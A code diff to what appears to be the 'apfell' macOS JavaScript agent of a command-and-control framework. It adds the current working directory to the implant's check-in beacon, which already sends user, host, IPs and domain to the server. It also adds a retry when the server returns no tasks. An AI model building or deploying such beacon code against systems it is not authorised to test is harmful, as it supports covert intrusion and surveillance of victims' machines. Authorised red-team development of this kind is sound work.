@@ -368,6 +368,7 @@ class customC2 extends baseC2{
   checkin(ip, pid, user, host, os, architecture, domain){
     let info = {'ips':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
     info["process_name"] = apfell.procInfo.processName.js;
+    info['cwd'] = $.NSFileManager.defaultManager.currentDirectoryPath.js;
     info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
     if(user === 'root'){info['integrity_level'] = 3;}
     //let req = null;
@@ -389,6 +390,9 @@ class customC2 extends baseC2{
     for(let i = 0; i < 10; i++){
         try{
             let task = this.make_request("GET", apfell.id,  {"tasking_size":1, "action": "get_tasking"});
+            if(task['tasks'] === undefined){
+                continue;
+            }
             return task['tasks'];
         }
         catch(error){
